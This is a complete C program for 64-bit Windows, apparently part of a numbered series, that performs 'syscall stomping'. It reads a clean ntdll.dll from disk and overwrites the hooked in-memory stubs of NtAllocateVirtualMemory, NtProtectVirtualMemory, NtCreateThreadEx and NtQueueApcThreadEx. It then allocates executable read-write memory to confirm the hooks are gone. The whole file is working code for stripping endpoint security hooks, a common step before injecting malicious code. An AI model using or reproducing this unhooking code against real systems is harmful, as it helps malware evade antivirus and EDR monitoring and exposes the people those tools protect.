#include <Windows.h>
#include <stdio.h>

// Restore hooked ntdll functions with clean syscall stubs from disk

BOOL StompSyscall(const char *functionName)
{
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll)
        return FALSE;

    // Get address of HOOKED function in memory
    FARPROC pFunction = GetProcAddress(hNtdll, functionName);
    if (!pFunction)
        return FALSE;

    printf("[*] Function %s at: %p (HOOKED)\n", functionName, pFunction);

    // Open clean ntdll from disk
    HANDLE hFile = CreateFileA(
        "C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to open clean ntdll\n");
        return FALSE;
    }

    // Map clean ntdll
    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    CloseHandle(hFile);

    if (!hMapping)
        return FALSE;

    LPVOID cleanNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hMapping);

    if (!cleanNtdll)
        return FALSE;

    // Parse export table to find clean function
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)cleanNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE *)cleanNtdll + pDos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((BYTE *)cleanNtdll + pNt->OptionalHeader.DataDirectory[0].VirtualAddress);

    DWORD *names = (DWORD *)((BYTE *)cleanNtdll + pExport->AddressOfNames);
    DWORD *functions = (DWORD *)((BYTE *)cleanNtdll + pExport->AddressOfFunctions);
    WORD *ordinals = (WORD *)((BYTE *)cleanNtdll + pExport->AddressOfNameOrdinals);

    // Find our function
    BYTE *cleanFunction = NULL;
    for (DWORD i = 0; i < pExport->NumberOfNames; i++)
    {
        char *name = (char *)((BYTE *)cleanNtdll + names[i]);
        if (strcmp(name, functionName) == 0)
        {
            cleanFunction = (BYTE *)cleanNtdll + functions[ordinals[i]];
            break;
        }
    }

    if (!cleanFunction)
    {
        UnmapViewOfFile(cleanNtdll);
        return FALSE;
    }

    // Copy clean syscall stub (first 32 bytes)
    BYTE cleanStub[32];
    memcpy(cleanStub, cleanFunction, 32);

    printf("[*] Clean stub: ");
    for (int i = 0; i < 16; i++)
        printf("%02x ", cleanStub[i]);
    printf("\n");

    // OVERWRITE hooked function with clean stub!
    DWORD oldProtect;
    VirtualProtect(pFunction, 32, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(pFunction, cleanStub, 32);
    VirtualProtect(pFunction, 32, oldProtect, &oldProtect);

    printf("[+] STOMPED: %s restored to clean syscall stub\n", functionName);

    UnmapViewOfFile(cleanNtdll);
    return TRUE;
}

int main()
{
    printf("[ Syscall Stomping - x64 ]\n");
    printf("[*] Restoring hooked syscalls from disk\n\n");

    // Restore critical syscalls
    StompSyscall("NtAllocateVirtualMemory");
    StompSyscall("NtProtectVirtualMemory");
    StompSyscall("NtCreateThreadEx");
    StompSyscall("NtQueueApcThreadEx");

    printf("\n[*] Calling restored NtAllocateVirtualMemory...\n");

    // Get restored function
    FARPROC pNtAllocate = GetProcAddress(
        GetModuleHandleA("ntdll.dll"),
        "NtAllocateVirtualMemory");

    typedef NTSTATUS(NTAPI * fpNtAllocateVirtualMemory)(
        HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);

    fpNtAllocateVirtualMemory NtAllocate = (fpNtAllocateVirtualMemory)pNtAllocate;

    PVOID baseAddr = NULL;
    SIZE_T size = 0x1000;

    NTSTATUS status = NtAllocate(
        GetCurrentProcess(),
        &baseAddr,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (status == 0)
    {
        printf("[+] SUCCESS: Memory allocated at: %p\n", baseAddr);
        printf("[+] Hook completely removed!\n");
        VirtualFree(baseAddr, 0, MEM_RELEASE);
    }

    return 0;
}

// x86_64-w64-mingw32-gcc -o 02_syscall_stomping.exe 02_syscall_stomping.c
